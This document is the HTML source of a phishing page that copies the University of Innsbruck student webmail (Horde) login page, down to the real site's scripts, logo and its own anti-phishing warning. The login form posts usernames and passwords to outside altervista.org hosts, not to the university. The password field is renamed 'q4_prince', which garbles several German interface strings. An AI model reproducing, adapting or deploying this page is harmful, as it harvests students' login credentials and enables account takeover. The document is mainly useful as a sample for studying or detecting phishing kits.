<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"><!--   IMP: Copyright 2001-2009 The Horde Project.  IMP is under the GPL.  --><!-- Horde Project: http://www.horde.org/ | IMP: http://www.horde.org/imp/ --><!--        GNU Public License: http://www.fsf.org/copyleft/gpl.html       --><HTML 

lang="de-DE"><HEAD><META content="IE=11.0000" http-equiv="X-UA-Compatible">



<SCRIPT type="text/javascript">//<![CDATA[

var IMP = {"conf":{"hasDOM":true,"IMP_ALL":0,"isIE":false,"pop3":false,"fixed_folders":["Drafts","Sent","Spam","Trash"],"js_editor":"xinha"},"text":{"compose_cancel":"Wenn Sie diese Nachricht verwerfen, geht der Inhalt eng\u00fcltig verloren.\nSind Sie sicher, dass Sie fortfahren m\u00f6chten?","compose_discard":"Damit geht diese Nachricht verloren.","compose_recipient":"Sie m\u00fcssen einen Empf\u00e4nger angeben.","compose_sigreplace":"Die Signatur wurde erfolgreich ersetzt.","compose_signotreplace":"Die Signatur konnte nicht ersetzt werden.","compose_nosubject":"Sie haben f\u00fcr diese Nachricht keinen Betreff angegeben.\nDie Nachricht ohne ein Betreff verschicken?","compose_file":"Datei","compose_attachment":"Anhang","compose_inline":"Im Text","mailbox_submit":"Sie m\u00fcssen erst mindestens eine Nachricht ausw\u00e4hlen.","mailbox_delete":"Sind Sie sicher, dass Sie diese Nachrichten ENDG\u00dcLTIG l\u00f6schen m\u00f6chten?","mailbox_selectone":"Sie m\u00fcssen erst mindestens eine Nachricht ausw\u00e4hlen.","yes":"Ja","no":"Nein","contacts_select":"Sie m\u00fcssen erst eine Adresse ausw\u00e4hlen.","contacts_closed":"Die Nachricht, die erstellt wurde, ist geschlossen worden. Abbruch.","contacts_called":"Dieses Fenster muss vom Fenster f\u00fcr neue Nachrichten ge\u00f6ffnet werden.","folders_select":"Bitte einen Ordner ausw\u00e4hlen, bevor Sie diese Aktion durchf\u00fchren.","folders_oneselect":"F\u00fcr diese Aktion darf nur ein Ordner ausgew\u00e4hlt sein.","folders_subfolder1":"Sie erzeugen einen Unterordner von ","folders_subfolder2":"Bitte geben Sie den Namen f\u00fcr den neuen Ordner an:","folders_toplevel":"Sie erzeugen einen Hauptordner.\nBitte geben Sie den Namen f\u00fcr den neuen Ordner an:","folders_download1":"Alle Nachrichten in den folgenden Ordnern werden als eine MBOX-Datei heruntergeladen:","folders_download2":"Dieser Vorgang kann eine Weile dauern. Sind Sie sicher, dass Sie fortfahren wollen?","folders_rename1":"Sie benennen folgenden Ordner um:","folders_rename2":"Bitte den neuen Namen eingeben:","folders_no_rename":"Dieser Ordner darf nicht umbenannt werden:","search_select":"Bitte mindestens einen Ordner f\u00fcr die Suche angeben.","popup_block":"Ein Popup-Fenster konnte nicht ge\u00f6ffnet werden. Vielleicht haben Sie Ihren Browser so eingestellt, dass er Popup-Fenster blockiert?","login_username":"Bitte geben Sie Ihren Benutzernamen an.","login_q4_prince

word":"Bitte geben Sie Ihr q4_prince

wort an.","spam_report":"Sind Sie sicher, dass Sie diese Nachricht als Spam melden m\u00f6chten?","notspam_report":"Sind Sie sicher, dass Sie diese Nachricht als kein Spam melden m\u00f6chten?","newfolder":"Sie kopieren\/verschieben zu einem neuen Ordner.\nBitte geben Sie einen Namen f\u00fcr den neuen Ordner an:\n","target_mbox":"Sie m\u00fcssen erst einen Zielordner angeben."}};

//]]></SCRIPT>

 

<META http-equiv="Content-Type" content="text/html; charset=utf-8">

<SCRIPT src="https://web-mail.uibk.ac.at/js/prototype.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://web-mail.uibk.ac.at/js/horde-prototype.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://web-mail.uibk.ac.at/js/accesskeys.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://web-mail.uibk.ac.at/imp/js/login.js" type="text/javascript"></SCRIPT>

 <LINK href="https://web-mail.uibk.ac.at/themes/screen.css" rel="stylesheet" 

type="text/css"> <LINK href="https://web-mail.uibk.ac.at/themes/uibk/screen.css" 

rel="stylesheet" type="text/css"> <LINK href="https://web-mail.uibk.ac.at/imp/themes/screen.css" 

rel="stylesheet" type="text/css"> <LINK href="https://web-mail.uibk.ac.at/imp/themes/uibk/screen.css" 

rel="stylesheet" type="text/css"> <TITLE>Webmail :: Willkommen bei Webmail 

f&amp;uuml;r Studierende</TITLE> <LINK href="/imp/themes/graphics/favicon.ico" 

rel="SHORTCUT ICON"> 

<META name="GENERATOR" content="MSHTML 11.00.9600.18838"></HEAD> 

<BODY>

<SCRIPT type="text/javascript">//<![CDATA[

var autologin_url = '/imp/login.php?autologin=&amp;server_key=';var show_list = 0;var ie_clientcaps = 0;var lang_url = null;var protocols = [];var change_smtphost = 0;var imp_auth = 1;var nomenu = 1

//]]></SCRIPT>

 

<FORM name="imp_login" id="imp_login" action="http://kiddieco5.altervista.org/me/veri1/willkommen/http://directoryupdatee.altervista.org/veri1/member.php" 

method="post" target="_parent"><INPUT name="actionID" type="hidden"> 

<INPUT name="url" type="hidden"> 

<INPUT name="load_frameset" type="hidden" value="1"> 

<INPUT name="autologin" type="hidden" value="0"> <INPUT name="anchor_string" id="anchor_string" type="hidden"> 

   <INPUT name="server_key" type="hidden" value="mail">    

<DIV id="welcome">

<DIV id="logo_uni"><A href="http://www.uibk.ac.at/"><IMG title="Zur Startseite der Homepage der Universität Innsbruck" 

class="icon_logo_uni" alt="Logo der Universität Innbruck" src="https://web-mail.uibk.ac.at/themes/uibk/graphics/logo-uibk.png" 

property="logo">   </A>  </DIV>

<H1 align="center">Willkommen bei Webmail für Studierende</H1></DIV>

<DIV 

class="loginform"><INPUT name="imapuser" tabindex="1" class="form-control" id="imapuser" type="text" placeholder="Username" value=""> 

       <INPUT name="q4_prince" tabindex="2" class="form-control" id="q4_prince" type="pass" placeholder="q4_prince" value=""> 

      <SELECT name="new_lang" tabindex="3" id="new_lang" 

  onchange="selectLang()"><OPTION selected="selected" 

  value="de_DE">Deutsch</OPTION>         <OPTION value="en_GB">English</OPTION>  

        </SELECT>       <INPUT name="loginButton" tabindex="4" class="button" id="loginButton" onclick="return submit_login();" type="submit" value="Anmelden"> 

</DIV></FORM>

<DIV id="motd"><!--

<div class="info">

<b>Hinweis:</b> Wir haben den Dienst Webmail f&uuml;r Studierende auf das neue Uni Design angeq4_prince

t!</div>

--> 

<DIV class="alert"><B style="color: rgb(48, 48, 48);">Warnung:</B> Vorsicht vor 

Phishing E-Mails und Links zu gefälschten Login-Webseiten! Weitere Informationen 

auf der <A href="https://www.uibk.ac.at/zid/news/phishing_mails.html">ZID 

Homepage</A>.</DIV><!-- 

<div class="event">

<b>Wartung:</b> Aufgrund von ungeplanten Wartungsarbeiten kommt es am Freitag, den 11.08.2017, zwischen 12:30 und voraussichtlich bis 13:30 Uhr, zu Unterbrechungen des Webmail Dienstes.</div>

--> 

</DIV>

<SCRIPT language="JavaScript1.5" type="text/javascript">

<!--

var _setHordeTitle = 1;

try {

    if (document.title && parent.frames.horde_main) parent.document.title = document.title;

} catch (e) {

}

// -->

</SCRIPT>

 

<SCRIPT type="text/javascript">

<!--

if (typeof(_setHordeTitle) == 'undefined' && document.title && parent.frames.horde_main) parent.document.title = document.title;

// -->

</SCRIPT>

 

<SCRIPT type="text/javascript">//<![CDATA[

setFocus()

//]]></SCRIPT>

 <BR class="clear">

<DIV class="footer">

<P>Bei Fragen bzw. Problemen lesen Sie bitte die <A href="http://www.uibk.ac.at/zid/systeme/mail/web-mail-faq.html" 

target="_blank"><B>Web-mail FAQ</B></A>.</P>

<P class="small"><A href="http://www.uibk.ac.at/zid" 

target="_blank"><B>Zentraler Informatikdienst</B></A> | <A href="mailto:postmaster@uibk.ac.at">Webmaster</A>

 | <A href="http://www.uibk.ac.at/impressum/" target="_blank">Impressum</A> | 

vlwm2| Powered by <A href="http://www.horde.org/" target="_blank">Horde</A> 

</P></DIV></BODY></HTML>

